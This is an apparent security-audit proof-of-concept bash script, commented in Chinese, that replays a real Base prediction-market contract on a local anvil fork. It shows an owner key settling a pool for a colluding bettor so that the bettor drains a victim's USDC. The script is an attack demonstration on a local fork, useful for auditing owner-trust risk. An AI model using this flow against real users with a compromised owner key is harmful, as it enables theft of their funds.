#!/usr/bin/env bash
# PoC: owner 一键把池子判给自己人 —— "知道地址 + 一把 key" 就能搬走别人的 U
#
# 在 Base 主网的 fork 上跑真实部署的 V4 合约（0xdFaF…2a3a）与真实 USDC。
# 不碰主网，不发任何真实交易：anvil 只在本地重放状态。
#
#   假设：攻击者拿到了 owner 私钥（或一次 7702 delegation）。合约本身没有漏洞 ——
#   settle() 就是 owner 的权威输入，F-01 只禁止 owner 自己下注，没禁止 owner 判给自己人。
#
#   印出来的数字：攻击者投入多少、拿回多少、受害者损失多少。
set -uo pipefail
export PATH="$HOME/.foundry/bin:$PATH"
cd "$(dirname "${BASH_SOURCE[0]}")/.." || exit 1

RPC=http://127.0.0.1:8545
ARENA=0xdFaF86Cf3B53c14f7Ef60d032E6C501161682a3a
USDC=0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913
POOL=$(python3 -c "import random; print(random.randint(10**8, 9*10**8))")

# anvil 默认账户（本地私钥，链上无意义）
PK_OWNER=$(sed -n 's/^PRIVATE_KEY=//p' .env | head -1)
PK_VICTIM=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
PK_ATK=0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
VICTIM=$(cast wallet address --private-key $PK_VICTIM)
ATK=$(cast wallet address --private-key $PK_ATK)
OWNER=$(cast wallet address --private-key $PK_OWNER)

say() { printf '%s\n' "$*"; }
bal() { cast call $USDC "balanceOf(address)(uint256)" "$1" --rpc-url $RPC | awk '{print $1}'; }
usd() { python3 -c "print(f'{int('${1:-0}')/1e6:.2f}')"; }

say "arena   $ARENA"
say "owner   $OWNER"
say "victim  $VICTIM"
say "attacker $ATK"
say "MIN_BET $(cast call $ARENA 'MIN_BET()(uint256)' --rpc-url $RPC)"
say ""
# fork 保留了主网余额（0.00006 ETH），不够付 anvil 的 base fee —— 本地给 owner 充值，纯 fork 行为。
cast rpc anvil_setBalance $OWNER 0xde0b6b3a7640000 --rpc-url $RPC >/dev/null

# ---- 1. 给两个普通人账户装 USDC（直接写 storage，不依赖任何水龙头）----
fund() {
  local who=$1 amount=$2
  local slot hex
  slot=$(cast index address "$who" 9)
  hex=$(python3 -c "print('0x' + format($amount, '064x'))")
  cast rpc anvil_setStorageAt $USDC "$slot" "$hex" --rpc-url $RPC >/dev/null
}
fund $VICTIM 500000000   # 500 USDC
fund $ATK    10000000    # 10 USDC
say "funded: victim $(usd $(bal $VICTIM)) U, attacker $(usd $(bal $ATK)) U"

# ---- 2. owner 开一张盘（任何人都能开的流程，这里用 owner 便于控制到期时间）----
NOW=$(cast block latest --field timestamp --rpc-url $RPC)
END=$((NOW + 3600))
cast send $ARENA "createPool(uint256,string,string,uint256)" $POOL \
  "Will the attacker drain this pool?" "PoC" $END \
  --private-key $PK_OWNER --rpc-url $RPC 2>&1 | grep -E '^(Error|status)' | tail -2
say "pool $POOL created, ends in 1h"

# ---- 3. 受害者押 NO 100 U；攻击者押 YES 1 U ----
V_BEFORE=$(bal $VICTIM); A_BEFORE=$(bal $ATK)
cast send $USDC "approve(address,uint256)" $ARENA 1000000000 --private-key $PK_VICTIM --rpc-url $RPC >/dev/null
cast send $USDC "approve(address,uint256)" $ARENA 1000000000 --private-key $PK_ATK --rpc-url $RPC >/dev/null
cast send $ARENA "bet(uint256,uint8,uint256,address)" $POOL 1 100000000 0x0000000000000000000000000000000000000000 --private-key $PK_VICTIM --rpc-url $RPC >/dev/null
cast send $ARENA "bet(uint256,uint8,uint256,address)" $POOL 0 1000000 0x0000000000000000000000000000000000000000 --private-key $PK_ATK --rpc-url $RPC >/dev/null
say "pool state: $(cast call $ARENA 'getPool(uint256)((string,string,uint64,uint8,uint8,uint256,uint256,uint256,bytes32))' $POOL --rpc-url $RPC | tr '\n' ' ' | cut -c1-160)"



# ---- 4. 时间推到到期后，owner 判 YES（攻击者那 1 U 那一边）----
cast rpc anvil_setNextBlockTimestamp $((END + 1)) --rpc-url $RPC >/dev/null
cast rpc anvil_mine --rpc-url $RPC >/dev/null
HASH=0x$(python3 -c "print('11'*32)")
cast send $ARENA "settle(uint256,uint8,bytes32)" $POOL 0 $HASH --private-key $PK_OWNER --rpc-url $RPC >/dev/null
say "settled: winningOption=0 (the 1 USDC side)"

# ---- 5. 攻击者领钱 ----
cast send $ARENA "claimRewards(uint256)" $POOL --private-key $PK_ATK --rpc-url $RPC >/dev/null
A_AFTER=$(bal $ATK)
V_AFTER=$(bal $VICTIM)

say ""
say "──────── 账本 ────────"
python3 - <<PY
a_before, a_after = $A_BEFORE/1e6, $A_AFTER/1e6
v_before, v_after = $V_BEFORE/1e6, $V_AFTER/1e6
print(f"attacker: {a_before:>8.2f} U -> {a_after:>8.2f} U   net {a_after-a_before:+.2f} U")
print(f"victim:   {v_before:>8.2f} U -> {v_after:>8.2f} U   net {v_after-v_before:+.2f} U")
print(f"attacker put in 1.00 U and took out {a_after-a_before+0:+.2f} U")
PY
